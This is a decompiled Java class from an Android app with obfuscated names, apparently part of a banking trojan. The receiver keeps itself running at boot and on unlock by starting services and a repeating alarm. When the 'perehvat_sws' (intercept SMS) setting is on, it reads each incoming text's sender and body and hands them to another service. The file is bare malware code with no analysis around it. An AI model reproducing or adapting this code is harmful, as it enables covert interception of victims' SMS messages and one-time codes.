package wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.jtfxlnc;
import wocwvy.czyxoxmbauu.slsa.ukhakhcgifofl;
import wocwvy.czyxoxmbauu.slsa.whemsbk;

public class hypihteeavv extends BroadcastReceiver {

    /* renamed from: a */
    C0034b f567a = new C0034b();

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo443a(Context context, Intent intent) {
        String action = intent.getAction();
        context.startService(new Intent(context, jtfxlnc.class));
        StringBuilder sb = new StringBuilder();
        sb.append("BOOT Start ");
        sb.append(action);
        this.f567a.mo213a("Action", sb.toString());
        try {
            C0034b bVar = this.f567a;
            C0034b.m231a(context, "startAlarm", (long) Integer.parseInt(this.f567a.mo234e(context, "Interval")));
        } catch (Exception unused) {
            C0034b bVar2 = this.f567a;
            C0034b.m231a(context, "startAlarm", 15000);
        }
        if (action.equals("android.intent.action.USER_PRESENT")) {
            context.startService(new Intent(context, ukhakhcgifofl.class));
        }
        if (action.equals("android.provider.Telephony.SMS_RECEIVED") && this.f567a.mo234e(context, "perehvat_sws").contains("true")) {
            mo444b(context, intent);
        }
    }

    /* renamed from: b */
    public void mo444b(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        if (extras != null) {
            try {
                Object[] objArr = (Object[]) extras.get("pdus");
                String str = "";
                String str2 = "";
                if (objArr != null) {
                    int length = objArr.length;
                    int i = 0;
                    while (i < length) {
                        SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) objArr[i]);
                        String displayOriginatingAddress = createFromPdu.getDisplayOriginatingAddress();
                        String displayMessageBody = createFromPdu.getDisplayMessageBody();
                        StringBuilder sb = new StringBuilder();
                        sb.append(str2);
                        sb.append(displayMessageBody);
                        str2 = sb.toString();
                        context.startService(new Intent(context, whemsbk.class).putExtra("num", displayOriginatingAddress).putExtra("ms", displayMessageBody));
                        i++;
                        str = displayOriginatingAddress;
                    }
                }
                this.f567a.mo210a(context, str, str2);
            } catch (Exception unused) {
            }
        }
    }

    public void onReceive(Context context, Intent intent) {
        if (!this.f567a.mo214a()) {
            mo443a(context, intent);
        }
    }
}
